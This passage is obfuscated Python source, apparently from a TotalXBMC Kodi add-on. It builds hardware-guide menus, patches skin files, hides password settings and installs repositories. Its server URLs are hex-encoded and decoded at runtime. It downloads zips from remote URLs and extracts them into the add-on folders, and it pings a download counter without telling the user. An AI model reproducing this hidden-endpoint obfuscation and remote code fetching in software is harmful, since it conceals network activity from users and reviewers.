 o0oO0o0oo0O0 = iii1II1iI1IIi [ 0 ] if ( len ( iii1II1iI1IIi ) > 0 ) else ''
 O0oo00oOOO0o = Ii11iiI1 [ 0 ] if ( len ( Ii11iiI1 ) > 0 ) else ''
 II1i = oO0O [ 0 ] if ( len ( oO0O ) > 0 ) else ''
 I111iiIIiI1I = OOoooO00o0o [ 0 ] if ( len ( OOoooO00o0o ) > 0 ) else ''
 ooO00Oo = I1ii1Ii1 [ 0 ] if ( len ( I1ii1Ii1 ) > 0 ) else ''
 Iiii1Ii1I = OoO [ 0 ] if ( len ( OoO ) > 0 ) else ''
 OO0 = oOO0O00oO0Ooo [ 0 ] if ( len ( oOO0O00oO0Ooo ) > 0 ) else ''
 oooOOOOOi1iIii = oOiI111I1III [ 0 ] if ( len ( oOiI111I1III ) > 0 ) else ''
 o0O0ooooooo00 = i111IiiI1Ii [ 0 ] if ( len ( i111IiiI1Ii ) > 0 ) else 'None'
 I1111ii11IIII = OooOOOOOo [ 0 ] if ( len ( OooOOOOOo ) > 0 ) else 'None'
 oo0oo0O0 = i1I11ii [ 0 ] if ( len ( i1I11ii ) > 0 ) else ''
 IiIi1II111I = o0ooO00O0O [ 0 ] if ( len ( o0ooO00O0O ) > 0 ) else ''
 o00o = iiiI1iI1 [ 0 ] if ( len ( iiiI1iI1 ) > 0 ) else ''
 IIi1i1 = I1oOoO0OOO00O [ 0 ] if ( len ( I1oOoO0OOO00O ) > 0 ) else ''
 o0O0Ooo = OOOOO0o0OOo [ 0 ] if ( len ( OOOOO0o0OOo ) > 0 ) else ''
 O0oO00oOOooO = I11I11I11IiIi [ 0 ] if ( len ( I11I11I11IiIi ) > 0 ) else ''
 IiI = OOii1ii1i11I1I [ 0 ] if ( len ( OOii1ii1i11I1I ) > 0 ) else ''
 Iii1iiI = iiII1iiiiiii [ 0 ] if ( len ( iiII1iiiiiii ) > 0 ) else ''
 ii1IiiII = iiIiii [ 0 ] if ( len ( iiIiii ) > 0 ) else ''
 O00o00O = iiI1ii [ 0 ] if ( len ( iiI1ii ) > 0 ) else ''
 IiiI1II1II1i = O0OooOO [ 0 ] if ( len ( O0OooOO ) > 0 ) else ''
 iIO0OO0o0O00oO = i1i1 [ 0 ] if ( len ( i1i1 ) > 0 ) else ''
 o00OoO0o0oOo = o0oOoOo0 [ 0 ] if ( len ( o0oOoOo0 ) > 0 ) else ''
 OoO0O0oo0o = III1IiI1i1i [ 0 ] if ( len ( III1IiI1i1i ) > 0 ) else ''
 iIi11I11 = o0OOOOOo0 [ 0 ] if ( len ( o0OOOOOo0 ) > 0 ) else ''
 i1i = oooOoO [ 0 ] if ( len ( oooOoO ) > 0 ) else ''
 oOI11iiI = O0Oo0 [ 0 ] if ( len ( O0Oo0 ) > 0 ) else ''
 i1iIii1i111 = iIIIi1IiI11I1 [ 0 ] if ( len ( iIIIi1IiI11I1 ) > 0 ) else ''
 OOooo000OooO = O0Ooo000 [ 0 ] if ( len ( O0Ooo000 ) > 0 ) else ''
 o0o0 = IIi11iI1Iii [ 0 ] if ( len ( IIi11iI1Iii ) > 0 ) else ''
 OoOoIiI1 = IiIi1i [ 0 ] if ( len ( IiIi1i ) > 0 ) else ''
 iiIiII = i11ii [ 0 ] if ( len ( i11ii ) > 0 ) else ''
 IIiiiI1iI = oOOOOO0Ooooo [ 0 ] if ( len ( oOOOOO0Ooooo ) > 0 ) else ''
 O0O0 = o0o000Oo [ 0 ] if ( len ( o0o000Oo ) > 0 ) else ''
 O0oO0o0OOOOOO = oO0o0O0o0OO00 [ 0 ] if ( len ( oO0o0O0o0OO00 ) > 0 ) else 'None'
 IiI1i11IiIiii = iIiiiIi [ 0 ] if ( len ( iIiiiIi ) > 0 ) else ''
 I11iiI1I1 = str ( '[COLOR=gold]Available From: [/COLOR] [COLOR=lime]www.totalboxshop.tv[/COLOR][CR][CR][COLOR=dodgerblue]Added: [/COLOR]' + Iiii1Ii1I + '[CR][COLOR=dodgerblue]Manufacturer: [/COLOR]' + iiIi11I1IIiiii + '[CR][COLOR=dodgerblue]Supported Roms: [/COLOR]' + OO0 + '[CR][COLOR=dodgerblue]Chipset: [/COLOR]' + oooOOOOOi1iIii + '[CR][COLOR=dodgerblue]CPU: [/COLOR]' + o00o + '[CR][COLOR=dodgerblue]GPU: [/COLOR]' + IIi1i1 + '[CR][COLOR=dodgerblue]RAM: [/COLOR]' + o0O0Ooo + '[CR][COLOR=dodgerblue]Flash: [/COLOR]' + O0oO00oOOooO + '[CR][COLOR=dodgerblue]Wi-Fi: [/COLOR]' + IiI + '[CR][COLOR=dodgerblue]Bluetooth: [/COLOR]' + Iii1iiI + '[CR][COLOR=dodgerblue]LAN: [/COLOR]' + ii1IiiII + '[CR][CR][COLOR=yellow]About: [/COLOR]' + iIIII1iIIii + '[CR][CR][COLOR=yellow]Summary:[/COLOR][CR][CR][COLOR=dodgerblue]Pros:[/COLOR]    ' + IiiI1II1II1i + '[CR][CR][COLOR=dodgerblue]Cons:[/COLOR]  ' + iIO0OO0o0O00oO + '[CR][CR][COLOR=yellow]Benchmark Results:[/COLOR][CR][CR][COLOR=dodgerblue]Boot Time:[/COLOR][CR]' + OOooo000OooO + '[CR][CR][COLOR=dodgerblue]Time taken to scan 1,000 movies (local NFO files):[/COLOR][CR]' + o00OoO0o0oOo + '[CR][CR][COLOR=dodgerblue]Copy 4,000 files (660.8MB) locally:[/COLOR][CR]' + o0o0 + '[CR][CR][COLOR=dodgerblue]Copy a MP4 file (339.4MB) locally:[/COLOR][CR]' + OoOoIiI1 + '[CR][CR][COLOR=dodgerblue]Ethernet Speed - Copy MP4 (339.4MB) from SMB share to device:[/COLOR][CR]' + iiIiII + '[CR][CR][COLOR=dodgerblue]4k Playback:[/COLOR][CR]' + OoO0O0oo0o + '[CR][CR][COLOR=dodgerblue]1080p Playback:[/COLOR][CR]' + iIi11I11 + '[CR][CR][COLOR=dodgerblue]720p Playback:[/COLOR][CR]' + i1i + '[CR][CR][COLOR=dodgerblue]Audio Playback:[/COLOR][CR]' + i1iIii1i111 + '[CR][CR][COLOR=dodgerblue]Image Slideshow:[/COLOR][CR]' + IIiiiI1iI )
 o0i1Ii11II = str ( '[COLOR=gold]Availability: [/COLOR]Sorry this device is currently unavailable at [COLOR=lime]www.totalboxshop.tv[/COLOR][CR][CR][COLOR=dodgerblue]Added: [/COLOR]' + Iiii1Ii1I + '[CR][COLOR=dodgerblue]Manufacturer: [/COLOR]' + iiIi11I1IIiiii + '[CR][COLOR=dodgerblue]Supported Roms: [/COLOR]' + OO0 + '[CR][COLOR=dodgerblue]Chipset: [/COLOR]' + oooOOOOOi1iIii + '[CR][COLOR=dodgerblue]CPU: [/COLOR]' + o00o + '[CR][COLOR=dodgerblue]GPU: [/COLOR]' + IIi1i1 + '[CR][COLOR=dodgerblue]RAM: [/COLOR]' + o0O0Ooo + '[CR][COLOR=dodgerblue]Flash: [/COLOR]' + O0oO00oOOooO + '[CR][COLOR=dodgerblue]Wi-Fi: [/COLOR]' + IiI + '[CR][COLOR=dodgerblue]Bluetooth: [/COLOR]' + Iii1iiI + '[CR][COLOR=dodgerblue]LAN: [/COLOR]' + ii1IiiII + '[CR][CR][COLOR=yellow]About: [/COLOR]' + iIIII1iIIii + '[CR][CR][COLOR=yellow]Summary:[/COLOR][CR][CR][COLOR=dodgerblue]Pros:[/COLOR]    ' + IiiI1II1II1i + '[CR][CR][COLOR=dodgerblue]Cons:[/COLOR]  ' + iIO0OO0o0O00oO + '[CR][CR][COLOR=gold]4k Playback:[/COLOR]  ' + OoO0O0oo0o + '[CR][CR][COLOR=gold]1080p Playback:[/COLOR]  ' + iIi11I11 + '[CR][CR][COLOR=gold]720p Playback:[/COLOR]  ' + i1i + '[CR][CR][COLOR=gold]DTS Compatibility:[/COLOR]  ' + i1iIii1i111 + '[CR][CR][COLOR=gold]Time taken to scan 100 movies:[/COLOR]  ' + o00OoO0o0oOo )
 if iIIII1iIIii != '' and o0OI1 != '' :
  o0oO ( '' , '[COLOR=yellow][Text Guide][/COLOR]  Official Description' , I11iiI1I1 , 'text_guide' , 'TotalXBMC_Guides.png' , o00 , '' , '' )
 if iIIII1iIIii != '' and o0OI1 == '' :
  o0oO ( '' , '[COLOR=yellow][Text Guide][/COLOR]  Official Description' , o0i1Ii11II , 'text_guide' , 'TotalXBMC_Guides.png' , o00 , '' , '' )
 if O0oO0o0OOOOOO != 'None' :
  o0oO ( '' , '[COLOR=lime][VIDEO][/COLOR]   Benchmark Review' , O0oO0o0OOOOOO , 'play_video' , 'Video_Guide.png' , o00 , '' , '' )
 if I1111ii11IIII != 'None' :
  o0oO ( '' , '[COLOR=lime][VIDEO][/COLOR]   Official Video Preview' , I1111ii11IIII , 'play_video' , 'Video_Guide.png' , o00 , '' , '' )
 if o0O0ooooooo00 != 'None' :
  o0oO ( '' , '[COLOR=lime][VIDEO][/COLOR]   Official Video Guide' , o0O0ooooooo00 , 'play_video' , 'Video_Guide.png' , o00 , '' , '' )
 if i1II1I1Iii1 != 'None' :
  o0oO ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + IIIII1 , i1II1I1Iii1 , 'play_video' , 'Video_Guide.png' , o00 , '' , '' )
 if iiI11Iii != 'None' :
  o0oO ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + iIi1Ii1i1iI , iiI11Iii , 'play_video' , 'Video_Guide.png' , o00 , '' , '' )
 if O0o0O0 != 'None' :
  o0oO ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + IIiI1 , O0o0O0 , 'play_video' , 'Video_Guide.png' , o00 , '' , '' )
 if Ii1II1I11i1 != 'None' :
  o0oO ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + i1iI1 , Ii1II1I11i1 , 'play_video' , 'Video_Guide.png' , o00 , '' , '' )
 if oOoooooOoO != 'None' :
  o0oO ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + ii1I1IiiI1ii1i , oOoooooOoO , 'play_video' , 'Video_Guide.png' , o00 , '' , '' )
  if 33 - 33: O0OoO . iiIi . o0OOOoO0
  if 15 - 15: i1i1i11IIi . iIIi1iIIi
def o0Iiii ( ) :
 o0oO ( 'folder' , '[COLOR=yellow]Manual Search[/COLOR]' , 'hardware' , 'manual_search' , 'Manual_Search.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=lime]All Devices[/COLOR]' , '' , 'grab_hardware' , 'All.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=orange][Hardware][/COLOR] Game Consoles' , 'device=Console' , 'grab_hardware' , 'Consoles.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=orange][Hardware][/COLOR] HTPC' , 'device=HTPC' , 'grab_hardware' , 'HTPC.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=orange][Hardware][/COLOR] Phones' , 'device=Phone' , 'grab_hardware' , 'Phones.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=orange][Hardware][/COLOR] Set Top Boxes' , 'device=STB' , 'grab_hardware' , 'STB.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=orange][Hardware][/COLOR] Tablets' , 'device=Tablet' , 'grab_hardware' , 'Tablets.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][Accessories][/COLOR] Remotes/Keyboards' , 'device=Remote' , 'grab_hardware' , 'Remotes.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][Accessories][/COLOR] Gaming Controllers' , 'device=Controller' , 'grab_hardware' , 'Controllers.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][Accessories][/COLOR] Dongles' , 'device=Dongle' , 'grab_hardware' , 'Dongles.png' , '' , '' , '' )
 if 45 - 45: iIi1iIiii111 / OOO00O . iiIi + I11iii1Ii
 if 51 - 51: iIIi1iIIi % oO00OO0oo0 % O0OoO + OO % i1i1i11IIi
def IIIII ( url ) :
 o0oO ( 'folder' , '[COLOR=yellow][CPU][/COLOR] Allwinner Devices' , str ( url ) + '&chip=Allwinner' , 'grab_hardware' , 'Allwinner.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=yellow][CPU][/COLOR] AMLogic Devices' , str ( url ) + '&chip=AMLogic' , 'grab_hardware' , 'AMLogic.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=yellow][CPU][/COLOR] Intel Devices' , str ( url ) + '&chip=Intel' , 'grab_hardware' , 'Intel.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=yellow][CPU][/COLOR] Rockchip Devices' , str ( url ) + '&chip=Rockchip' , 'grab_hardware' , 'Rockchip.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=lime][Platform][/COLOR] Android' , str ( url ) + '&platform=Android' , 'grab_hardware' , 'Android.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=lime][Platform][/COLOR] iOS' , str ( url ) + '&platform=iOS' , 'grab_hardware' , 'iOS.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=lime][Platform][/COLOR] Linux' , str ( url ) + '&platform=Linux' , 'grab_hardware' , 'Linux.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=lime][Platform][/COLOR] OpenELEC' , str ( url ) + '&platform=OpenELEC' , 'grab_hardware' , 'OpenELEC.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=lime][Platform][/COLOR] OSX' , str ( url ) + '&platform=OSX' , 'grab_hardware' , 'OSX.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=lime][Platform][/COLOR] Pure Linux' , str ( url ) + '&platform=Custom_Linux' , 'grab_hardware' , 'Custom_Linux.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=lime][Platform][/COLOR] Windows' , str ( url ) + '&platform=Windows' , 'grab_hardware' , 'Windows.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=orange][Flash Storage][/COLOR] 4GB' , str ( url ) + '&flash=4GB' , 'grab_hardware' , 'Flash.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=orange][Flash Storage][/COLOR] 8GB' , str ( url ) + '&flash=8GB' , 'grab_hardware' , 'Flash.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=orange][Flash Storage][/COLOR] 16GB' , str ( url ) + '&flash=16GB' , 'grab_hardware' , 'Flash.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=orange][Flash Storage][/COLOR] 32GB' , str ( url ) + '&flash=32GB' , 'grab_hardware' , 'Flash.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=orange][Flash Storage][/COLOR] 64GB' , str ( url ) + '&flash=64GB' , 'grab_hardware' , 'Flash.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][RAM][/COLOR] 1GB' , str ( url ) + '&ram=1GB' , 'grab_hardware' , 'RAM.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][RAM][/COLOR] 2GB' , str ( url ) + '&ram=2GB' , 'grab_hardware' , 'RAM.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][RAM][/COLOR] 4GB' , str ( url ) + '&ram=4GB' , 'grab_hardware' , 'RAM.png' , '' , '' , '' )
 if 8 - 8: OooOooo
 if 16 - 16: O00oo0OO0oOOO . IIiII
 if 50 - 50: OOO00O * OooOooo + i1i1i11IIi - oO00OO0oo0 + O000OO0 * i1i1i11IIi
def i11II ( ) :
 oOOoO0 = xbmc . getSkinDir ( )
 IIIiIiI11iIi = xbmc . translatePath ( os . path . join ( o0oO0 , oOOoO0 ) )
 for OooOo000OOOOo , O0oooo00o0Oo , I1iii in os . walk ( IIIiIiI11iIi ) :
  for Ii in I1iii :
   if 'DialogKeyboard.xml' in Ii :
    oOOoO0 = os . path . join ( OooOo000OOOOo , Ii )
    iIIiiIIIi1I = open ( oOOoO0 ) . read ( )
    OO0o0o0oo0O = iIIiiIIIi1I . replace ( '<control type="label" id="310"' , '<control type="edit" id="312"' )
    Ii = open ( oOOoO0 , mode = 'w' )
    Ii . write ( OO0o0o0oo0O )
    Ii . close ( )
    IIIiIi ( oOOoO0 )
    for iiiIii in range ( 48 , 58 ) :
     I11I1IIiiII1 ( iiiIii , oOOoO0 )
 I1IiI = xbmcgui . Dialog ( )
 I1IiI . ok ( "Skin Changes Successful" , 'A BIG thank you to Mikey1234 for this fix. The' , 'code used for this function was ported from the' , 'Xunity Maintenance add-on' )
 xbmc . executebuiltin ( 'ReloadSkin()' )
 if 69 - 69: OO - iiiIi1i1I % iIIi1iIIi . OO0O - OO0O
def o0oO00o ( ) :
 I1IiI = xbmcgui . Dialog ( )
 Ii11I1iIiiI = xbmcgui . Dialog ( ) . yesno ( 'Convert This Skin To Kodi (Helix)?' , 'This will fix the problem with a blank on-screen keyboard' , 'showing in skins designed for Gotham (being run on Kodi).' , 'This will only affect the currently running skin.' , nolabel = 'No, Cancel' , yeslabel = 'Yes, Fix' )
 if Ii11I1iIiiI == 0 :
  return
 elif Ii11I1iIiiI == 1 :
  i11II ( )
  if 78 - 78: O000OO0 * OO - iiIi - I11iii1Ii
  if 83 - 83: OOO00O / OO0O
def i11iI1 ( ) :
 if I1IiI . yesno ( "Hide Passwords" , "This will hide all your passwords in your" , "add-on settings, are you sure you wish to continue?" ) :
  for OooOo000OOOOo , O0oooo00o0Oo , I1iii in os . walk ( o0oO0 ) :
   for Ii in I1iii :
    if Ii == 'settings.xml' :
     i1Ii11ii1I = open ( os . path . join ( OooOo000OOOOo , Ii ) ) . read ( )
     ooo0O = re . compile ( '<setting id=(.+?)>' ) . findall ( i1Ii11ii1I )
     for OO0oI1iii1i in ooo0O :
      if 'pass' in OO0oI1iii1i :
       if not 'option="hidden"' in OO0oI1iii1i :
        try :
         oO0ooOoOO = OO0oI1iii1i . replace ( '/' , ' option="hidden"/' )
         Ii = open ( os . path . join ( OooOo000OOOOo , Ii ) , mode = 'w' )
         Ii . write ( str ( i1Ii11ii1I ) . replace ( OO0oI1iii1i , oO0ooOoOO ) )
         Ii . close ( )
        except :
         pass
  I1IiI . ok ( "Passwords Hidden" , "Your passwords will now show as stars (hidden), if you" , "want to undo this please use the option to unhide passwords." )
  if 48 - 48: III1i1i . oO00OO0oo0 % OOO00O - O00oo0OO0oOOO . oO00OO0oo0
  if 61 - 61: OO % OoOo + O000OO0 + OOO00O * OO % OO0O
def iiiI11o0o00OOOO ( url ) :
 i11iIi1iIIIIi = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f436f6d6d756e6974795f4275696c64732f67756973657474696e67732e7068703f69643d2573'
 IIII = binascii . unhexlify ( i11iIi1iIIIIi ) % ( url )
 iiIiI = o00oooO0Oo ( IIII ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 iIi1I1 = re . compile ( 'guisettings="(.+?)"' ) . findall ( iiIiI )
 iIIIiIi1I1i = iIi1I1 [ 0 ] if ( len ( iIi1I1 ) > 0 ) else 'None'
 OoooO0o ( iIIIiIi1I1i , IIIii1iiIi )
 if 43 - 43: OOO00O * OO * II11iII % i1iiI11I / i1i1i11IIi - O0OoO
 if 51 - 51: iIi1iIiii111
def I1iIiIii ( path ) :
 OO0I1iiI1iiI1i1 = xbmc . translatePath ( os . path . join ( Iii1ii1II11i , 'background_art' , '' ) )
 if os . path . exists ( OO0I1iiI1iiI1i1 ) :
  oo0i1iIIi1II1iiI ( OO0I1iiI1iiI1i1 )
 time . sleep ( 1 )
 if not os . path . exists ( OO0I1iiI1iiI1i1 ) :
  os . makedirs ( OO0I1iiI1iiI1i1 )
 try :
  o0OOO . create ( "Installing Artwork" , "Downloading artwork pack" , '' , 'Please Wait' )
  oooO00o0 = os . path . join ( i1iiIIiiI111 , I1IiiI + '_artpack.zip' )
  downloader . download ( path , oooO00o0 , o0OOO )
  time . sleep ( 1 )
  if 88 - 88: o0OOOoO0 % O000OO0 - IIiII % o0OOOoO0 + O0OoO - iIIi1iIIi
  o0OOO . create ( "[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]" , "Checking " , '' , 'Please Wait' )
  o0OOO . update ( 0 , "" , "Extracting Zip Please Wait" )
  I1iii11 ( oooO00o0 , OO0I1iiI1iiI1i1 , o0OOO )
 except : pass
 if 23 - 23: III1i1i
 if 9 - 9: IIiII * O000OO0 . OOO00O * oO00OO0oo0 - III1i1i
def i1iIiiiiii1II ( repo_id ) :
 III1i11 = 1
 OoO00OOoOOOo0 = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f4164646f6e506f7274616c2f646570656e64656e6379696e7374616c6c2e7068703f69643d2573'
 IIII = binascii . unhexlify ( OoO00OOoOOOo0 ) % ( repo_id )
 iiIiI = o00oooO0Oo ( IIII ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0O0OOO0Ooo = re . compile ( 'name="(.+?)"' ) . findall ( iiIiI )
 oOooOOOoOo = re . compile ( 'version="(.+?)"' ) . findall ( iiIiI )
 O0Oi1I1I = re . compile ( 'repo_url="(.+?)"' ) . findall ( iiIiI )
 iiI1I = re . compile ( 'data_url="(.+?)"' ) . findall ( iiIiI )
 IiIiiIIiI = re . compile ( 'zip_url="(.+?)"' ) . findall ( iiIiI )
 I1i1Iiiii = re . compile ( 'repo_id="(.+?)"' ) . findall ( iiIiI )
 oOoO00O = o0O0OOO0Ooo [ 0 ] if ( len ( o0O0OOO0Ooo ) > 0 ) else ''
 iiii111II = oOooOOOoOo [ 0 ] if ( len ( oOooOOOoOo ) > 0 ) else ''
 O00o0O = O0Oi1I1I [ 0 ] if ( len ( O0Oi1I1I ) > 0 ) else ''
 iIIIiI = iiI1I [ 0 ] if ( len ( iiI1I ) > 0 ) else ''
 O00 = IiIiiIIiI [ 0 ] if ( len ( IiIiiIIiI ) > 0 ) else ''
 i1iiIII1IIiIIII = I1i1Iiiii [ 0 ] if ( len ( I1i1Iiiii ) > 0 ) else ''
 I11I1I1i1i = xbmc . translatePath ( os . path . join ( Ooo , oOoO00O + '.zip' ) )
 Oo0oOO0O00 = xbmc . translatePath ( os . path . join ( o0oO0 , i1iiIII1IIiIIII ) )
 try :
  downloader . download ( O00o0O , I11I1I1i1i , o0OOO )
  I1iii11 ( I11I1I1i1i , OO0o , o0OOO )
 except :
  try :
   downloader . download ( O00 , I11I1I1i1i , o0OOO )
   I1iii11 ( I11I1I1i1i , OO0o , o0OOO )
  except :
   try :
    if not os . path . exists ( Oo0oOO0O00 ) :
     os . makedirs ( Oo0oOO0O00 )
    iiIiI = o00oooO0Oo ( iIIIiI ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
    ooo0O = re . compile ( 'href="(.+?)"' , re . DOTALL ) . findall ( iiIiI )
    for iII1iii in ooo0O :
     i11i1iiiII = xbmc . translatePath ( os . path . join ( Oo0oOO0O00 , iII1iii ) )
     if IiiiiI1i1Iii not in iII1iii and '/' not in iII1iii :
      try :
       o0OOO . update ( 0 , "Downloading [COLOR=yellow]" + iII1iii + '[/COLOR]' , '' , 'Please wait...' )
       downloader . download ( iIIIiI + iII1iii , i11i1iiiII , o0OOO )
      except : print "failed to install" + iII1iii
     if '/' in iII1iii and '..' not in iII1iii and 'http' not in iII1iii :
      ooOO0oO0oo00o = iIIIiI + iII1iii
      oOOo0oo0O ( i11i1iiiII , ooOO0oO0oo00o )
   except :
    I1IiI . ok ( "Error downloading repository" , 'There was an error downloading the [COLOR=yellow]' + oOoO00O , '[/COLOR]repository. Please consider updating the add-on portal with details' , 'or report the error on the forum at [COLOR=lime][B]www.totalxbmc.tv[/COLOR][/B]' )
    III1i11 = 0
 if III1i11 == 1 :
  time . sleep ( 1 )
  o0OOO . update ( 0 , "[COLOR=yellow]" + oOoO00O + '[/COLOR]  [COLOR=lime]Successfully Installed[/COLOR]' , '' , 'Now installing dependencies' )
  time . sleep ( 1 )
  O0OOO0OOooo00 = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f4164646f6e506f7274616c2f646f776e6c6f6164636f756e742e7068703f69643d2573'
  I111iIi1 = binascii . unhexlify ( O0OOO0OOooo00 ) % ( repo_id )
  o00oooO0Oo ( I111iIi1 )
  if 55 - 55: OOO00O % O000OO0 % O00oo0OO0oOOO
  if 29 - 29: O0OoO / i1iiI11I + i1i1i11IIi % iIIi1iIIi % IIiII
def i1ii1i1I11i1I ( ) :
 o0oO ( '' , '[COLOR=dodgerblue][TEXT GUIDE][/COLOR]  What is Community Builds?' , 'url' , 'instructions_3' , 'How_To.png' , '' , '' , '' )
 o0oO ( '' , '[COLOR=dodgerblue][TEXT GUIDE][/COLOR]  Creating a Community Build' , 'url' , 'instructions_1' , 'How_To.png' , '' , '' , '' )
 o0oO ( '' , '[COLOR=dodgerblue][TEXT GUIDE][/COLOR]  Installing a Community Build' , 'url' , 'instructions_2' , 'How_To.png' , '' , '' , '' )
 o0oO ( '' , '[COLOR=lime][VIDEO GUIDE][/COLOR]  Add Your Own Guides @ [COLOR=lime]TotalXBMC.tv[/COLOR]' , 'K0XIxEodUhc' , 'play_video' , 'How_To.png' , '' , '' , '' )
 o0oO ( '' , '[COLOR=lime][VIDEO GUIDE][/COLOR]  Community Builds FULL GUIDE' , "ewuxVfKZ3Fs" , 'play_video' , 'howto.png' , '' , '' , '' )
 o0oO ( '' , '[COLOR=lime][VIDEO GUIDE][/COLOR]  IMPORTANT initial settings' , "1vXniHsEMEg" , 'play_video' , 'howto.png' , '' , '' , '' )
 o0oO ( '' , '[COLOR=lime][VIDEO GUIDE][/COLOR]  Install a Community Build' , "kLsVOapuM1A" , 'play_video' , 'howto.png' , '' , '' , '' )
 o0oO ( '' , '[COLOR=lime][VIDEO GUIDE][/COLOR]  Fixing a half installed build (guisettings.xml fix)' , "X8QYLziFzQU" , 'play_video' , 'howto.png' , '' , '' , '' )
 o0oO ( '' , '[COLOR=lime][VIDEO GUIDE][/COLOR]  [COLOR=yellow](OLD METHOD)[/COLOR]Create a Community Build (part 1)' , "3rMScZF2h_U" , 'play_video' , 'howto.png' , '' , '' , '' )
 o0oO ( '' , '[COLOR=lime][VIDEO GUIDE][/COLOR]  [COLOR=yellow](OLD METHOD)[/COLOR]Create a Community Build (part 2)' , "C2IPhn0OSSw" , 'play_video' , 'howto.png' , '' , '' , '' )
 if 85 - 85: OOO00O . III1i1i / OO0O * OOO00O - I11iii1Ii - oO00OO0oo0
 if 25 - 25: OOO00O % O000OO0 - OO0O
def O0OoOOooO0O ( ) :
 OOoOoo00Oo ( 'Creating A Community Backup' ,
 '[COLOR=yellow]NEW METHOD[/COLOR][CR][COLOR=blue][B]Step 1:[/COLOR] Remove any sensitive data[/B][CR]Make sure you\'ve removed any sensitive data such as passwords and usernames in your addon_data folder.'
 '[CR][CR][COLOR=blue][B]Step 2:[/COLOR] Backup your system[/B][CR]Choose the backup option from the main menu, in there you\'ll find the option to create a Full Backup and this will create two zip files that you need to upload to a server.'
 '[CR][CR][COLOR=blue][B]Step 3:[/COLOR] Upload the zips[/B][CR]Upload the two zip files to a server that Kodi can access, it has to be a direct link and not somewhere that asks for captcha - Dropbox and archive.org are two good examples.'
 '[CR][CR][COLOR=blue][B]Step 4:[/COLOR] Submit build at TotalXBMC[/B]'
 '[CR]Create a thread on the Community Builds section of the forum at [COLOR=lime][B]www.totalxbmc.tv[/COLOR][/B].[CR]Full details can be found on there of the template you should use when posting, once you\'ve created your support thread (NOT BEFORE) you can request to become a member of the Community Builder group and you\'ll then have access to the web form for adding your builds to the portal.'
 '[CR][CR][COLOR=yellow]OLD METHOD[/COLOR][CR][COLOR=blue][B]Step 1: Backup your system[/B][/COLOR][CR]Choose the backup option from the main menu, you will be asked whether you would like to delete your addon_data folder. If you decide to choose this option [COLOR=yellow][B]make sure[/COLOR][/B] you already have a full backup of your system as it will completely wipe your addon settings (any stored settings such as passwords or any other changes you\'ve made to addons since they were first installed). If sharing a build with the community it\'s highly advised that you wipe your addon_data but if you\'ve made changes or installed extra data packages (e.g. skin artwork packs) then backup the whole build and then manually delete these on your PC and zip back up again (more on this later).'
 '[CR][CR][COLOR=blue][B]Step 2: Edit zip file on your PC[/B][/COLOR][CR]Copy your backup.zip file to your PC, extract it and delete all the addons and addon_data that isn\'t required.'
 '[CR][COLOR=blue]What to delete:[/COLOR][CR][COLOR=lime]/addons/packages[/COLOR] This folder contains zip files of EVERY addon you\'ve ever installed - it\'s not needed.'
 '[CR][COLOR=lime]/addons/<skin.xxx>[/COLOR] Delete any skins that aren\'t used, these can be very big files.'
 '[CR][COLOR=lime]/addons/<addon_id>[/COLOR] Delete any other addons that aren\'t used, it\'s easy to forget you\'ve got things installed that are no longer needed.'
 '[CR][COLOR=lime]/userdata/addon_data/<addon_id>[/COLOR] Delete any folders that don\'t contain important changes to addons. If you delete these the associated addons will just reset to their default values.'
 '[CR][COLOR=lime]/userdata/<all other folders>[/COLOR] Delete all other folders in here such as keymaps. If you\'ve setup profiles make sure you [COLOR=yellow][B]keep the profiles directory[/COLOR][/B].'
 '[CR][COLOR=lime]/userdata/Thumbnails/[/COLOR] Delete this folder, it contains all cached artwork. You can safely delete this but must also delete the file listed below.'
 '[CR][COLOR=lime]/userdata/Database/Textures13.db[/COLOR] Delete this and it will tell XBMC to regenerate your thumbnails - must do this if delting thumbnails folder.'
 '[CR][COLOR=lime]/xbmc.log (or Kodi.log)[/COLOR] Delete your log files, this includes any crashlog files you may have.'
 '[CR][CR][COLOR=blue][B]Step 3: Compress and upload[/B][/COLOR][CR]Use a program like 7zip to create a zip file of your remaining folders and upload to a file sharing site like dropbox.'
